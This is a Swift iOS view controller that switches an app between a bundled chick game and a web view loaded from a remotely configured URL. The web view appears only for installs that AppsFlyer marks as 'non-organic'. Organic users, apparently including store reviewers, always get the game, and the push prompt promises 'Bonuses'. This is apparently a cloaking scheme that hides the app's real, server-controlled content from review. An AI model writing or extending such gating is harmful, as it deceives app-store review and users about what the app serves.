import UIKit
import WebKit

final class RootContainerViewController: UIViewController {
    private let reachability = Reachability()
    private let modeManager = LaunchModeManager.shared

    private var current: UIViewController?

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .systemBackground
        
        // Сразу показываем загрузочный экран
        showInitialLoading()
        
        Task { await startFlow() }
        NotificationCenter.default.addObserver(self, selector: #selector(openURLFromPush(_:)), name: .openURLInsideApp, object: nil)
    }
    
    private func showInitialLoading() {
        let loadingVC = EggLoadingBouncingViewController()
        loadingVC.disableAutoTransition()  // Отключаем автоматический переход
        let navController = UINavigationController(rootViewController: loadingVC)
        transition(to: navController)
    }

    @objc private func openURLFromPush(_ note: Notification) {
        guard let url = note.object as? URL else { 
            print("❌ [Push] Invalid URL in notification")
            return 
        }
        
        print("🔔 [Push] Opening URL from push notification: \(url.absoluteString)")
        print("🔔 [Push] ⚠️  This URL will NOT be saved - next launch will use config URL")
        
        // Всегда открываем веб-вью при получении push-уведомления с URL
        if let webVC = current as? WebContainerViewController {
            // Если уже показан веб-вью, просто загружаем новый URL
            print("🔔 [Push] Loading URL in existing WebView")
            webVC.load(url: url)
        } else {
            // Создаем новый веб-вью и переходим к нему
            print("🔔 [Push] Creating new WebView for push notification")
            let web = WebContainerViewController(initialURL: url)
            transition(to: web)
            
            // ВАЖНО: НЕ сохраняем URL из push-уведомления!
            // Режим остается тот же, что был до этого
            // При следующем запуске будет использоваться URL из конфига
            print("🔔 [Push] ⚠️  Push URL is temporary - not updating saved mode")
        }
    }

    private func transition(to vc: UIViewController) {
        addChild(vc)
        vc.view.frame = view.bounds
        vc.view.alpha = 0
        view.addSubview(vc.view)
        vc.didMove(toParent: self)

        let old = current
        current = vc

        UIView.transition(with: view, duration: 0.25, options: [.transitionCrossDissolve]) {
            vc.view.alpha = 1
            old?.view.alpha = 0
        } completion: { _ in
            old?.willMove(toParent: nil)
            old?.view.removeFromSuperview()
            old?.removeFromParent()
        }
    }

    private func showNoInternet() {
        let vc = NoInternetViewController { [weak self] in
            Task { await self?.startFlow(forceFirstLaunch: true) }
        }
        transition(to: vc)
    }

    private func showFan() {
        // Если уже показан загрузочный экран, переходим к основному приложению
        if let navController = current as? UINavigationController,
           navController.topViewController is EggLoadingBouncingViewController {
            // Заменяем ChickLoading на ChickTabBar (основное приложение)
            let tabBarVC = ChickTabBar()
            navController.setViewControllers([tabBarVC], animated: true)
            print("🎮 [UI] Transitioned from loading to main app")
            
            // Принудительно обновляем layout после перехода к игре
            DispatchQueue.main.async {
                self.forceLayoutUpdate()
            }
        } else {
            // Если по какой-то причине загрузочного экрана нет, создаем новый
            let vc = EggLoadingBouncingViewController()
            let navController = UINavigationController(rootViewController: vc)
            transition(to: navController)
            print("🎮 [UI] Created new loading screen for fan mode")
        }
    }

    private func showWeb(url: URL) {
        let web = WebContainerViewController(initialURL: url)
        transition(to: web)
        
        // Показываем экран уведомлений только при запуске WebView
        Task {
            await maybeAskPushPermission()
        }
        print("🌐 [UI] Transitioned from loading to web view: \(url)")
    }

    private func maybeAskPushPermission() async {
        // Проверяем что мы в режиме webview и можем спросить разрешение
        guard LaunchModeManager.shared.currentMode == .webview else { 
            print("🔔 [Push] Not in webview mode, skipping permission request")
            return 
        }
        
        let canAsk = await PushPermissionService.shared.canAskForPermission()
        guard canAsk else {
            print("🔔 [Push] Cannot ask for permission at this time")
            return
        }
        
        print("🔔 [Push] Showing push permission screen")
        
        let ask = PushPermissionViewController(
            onAllow: {
                print("🔔 [Push] User chose 'Yes, I Want Bonuses!'")
                PushPermissionService.shared.markPermissionAsked()
                PushPermissionService.shared.requestSystemAuthorization()
            },
            onLater: {
                print("🔔 [Push] User chose 'Skip'")
                PushPermissionService.shared.scheduleReaskIn3Days()
            }
        )
        
        await MainActor.run {
            present(ask, animated: true)
        }
    }
    
    private func forceLayoutUpdate() {
        print("🔄 [UI] Forcing layout update for orientation change")
        
        // Обновляем layout основного view
        view.setNeedsLayout()
        view.layoutIfNeeded()
        
        // Обновляем layout текущего контроллера
        if let currentVC = current {
            currentVC.view.setNeedsLayout()
            currentVC.view.layoutIfNeeded()
            
            // Если это navigation controller, обновляем его содержимое
            if let navController = currentVC as? UINavigationController {
                for vc in navController.viewControllers {
                    vc.view.setNeedsLayout()
                    vc.view.layoutIfNeeded()
                }
            }
        }
        
        // Принудительно обновляем ориентацию
        if #available(iOS 16.0, *) {
            view.window?.windowScene?.requestGeometryUpdate(.iOS(interfaceOrientations: .portrait))
        }
    }

    // MARK: Flow
    func startFlow(forceFirstLaunch: Bool = false) async {
        print("🚀 [UI] Starting flow, forceFirstLaunch: \(forceFirstLaunch)")
        
        // Диагностика для OneLink проблемы
        let conversionData = AppsFlyerHelper.shared.rawConversionDict()
        let deepLinkData = AppsFlyerHelper.shared.rawDeepLinkDict()
        
        print("🔍 [UI] Conversion data available: \(conversionData != nil)")
        print("🔍 [UI] Deep link data available: \(deepLinkData != nil)")
        
        if let conversion = conversionData {
            let afStatus = conversion["af_status"] as? String ?? "nil"
            print("🔍 [UI] Current af_status from conversion: '\(afStatus)'")
        }
        
        if let deepLink = deepLinkData {
            let pid = deepLink["pid"] as? String ?? "nil"
            let campaign = deepLink["c"] as? String ?? "nil"
            print("🔍 [UI] Deep link pid: '\(pid)', campaign: '\(campaign)'")
        }
        
        // При принудительном первом запуске сбрасываем флаг запретов
        if forceFirstLaunch {
            modeManager.resetConfigRequestsFlag()
        }
        
        // Проверяем флаг "больше не делать запросы к конфигу"
        if modeManager.shouldSkipConfigRequests {
            print("🚫 Skipping config requests permanently - showing fan mode")
            showFan()
            return
        }
        
        if !forceFirstLaunch, modeManager.currentMode != .undefined {
            // Subsequent launches
            switch modeManager.currentMode {
            case .webview:
                if await reachability.isConnected() {
                    if modeManager.isExpired() {
                        await refetchOrCached()
                    } else if let url = modeManager.cachedURL {
                        showWeb(url: url)
                    } else {
                        await refetchOrCached()
                    }
                } else {
                    showNoInternet()
                }
            case .fan:
                showFan()
            case .undefined: break
            }
            return
        }

        // First launch flow
        guard await reachability.isConnected() else {
            print("🚫 No internet on first launch")
            showNoInternet()
            return
        }

        do {
            let merged = await AppsFlyerHelper.shared.buildMergedPayload()
            // Enforce rule: only allow webview when Non-organic
            let afStatus = (merged["af_status"] as? String)?.lowercased()
            print("🔍 [DEBUG] Original af_status from merged: '\(afStatus ?? "nil")'")
            print("🔍 [DEBUG] Full merged payload: \(merged)")
            
            let canAskConfig = (afStatus == "non-organic")
            print("🔍 [DEBUG] canAskConfig: \(canAskConfig)")
            print("🔍 [DEBUG] Logic: af_status '\(afStatus ?? "nil")' == 'non-organic' = \(canAskConfig)")
            
            
            if canAskConfig {
                print("🔍 [DEBUG] AF Status: \(afStatus ?? "nil"), sending config request...")
                print("🔍 [DEBUG] Merged payload keys: \(merged.keys.sorted())")
                let resp = try await ConfigClient.shared.fetchConfig(withMergedPayload: merged)
                print("🔍 [DEBUG] Server response: ok=\(resp.ok), url=\(resp.url ?? "nil"), message=\(resp.message ?? "nil")")
                if resp.ok, let u = resp.url, let url = URL(string: u) {
                    modeManager.cache(url: u, expires: resp.expires)
                    modeManager.currentMode = .webview
                    
                    
                    showWeb(url: url)
                } else {
                    modeManager.currentMode = .fan
                    
                    
                    showFan()
                }
            } else {
                print("ℹ️ AF status not Non-organic → fan mode")
                modeManager.currentMode = .fan
                
                
                showFan()
            }
        } catch {
            print("❌ First launch config error: \(error)")
            // По требованиям: если первый запрос неуспешен и нет сохраненного URL,
            // запустить игру и больше не делать запросов к конфигу
            if modeManager.cachedURL == nil {
                print("🎮 No cached URL - switching to fan mode permanently")
                modeManager.currentMode = .fan
                modeManager.markNoMoreConfigRequests()
                showFan()
            } else {
                // Если есть кешированный URL, используем его
                showWeb(url: modeManager.cachedURL!)
            }
        }
    }

    private func refetchOrCached() async {
        do {
            let merged = await AppsFlyerHelper.shared.buildMergedPayload()
            let resp = try await ConfigClient.shared.fetchConfig(withMergedPayload: merged)
            if resp.ok, let u = resp.url, let url = URL(string: u) {
                modeManager.cache(url: u, expires: resp.expires)
                showWeb(url: url)
            } else if let cached = modeManager.cachedURL {
                print("✅ Loaded from cache")
                showWeb(url: cached)
            } else {
                print("🎮 Falling back to fan")
                modeManager.currentMode = .fan
                showFan()
            }
        } catch {
            if let cached = modeManager.cachedURL {
                print("✅ Loaded from cache (error path): \(error)")
                showWeb(url: cached)
            } else {
                print("🎮 Fallback to fan (no cache)")
                modeManager.currentMode = .fan
                showFan()
            }
        }
    }
}
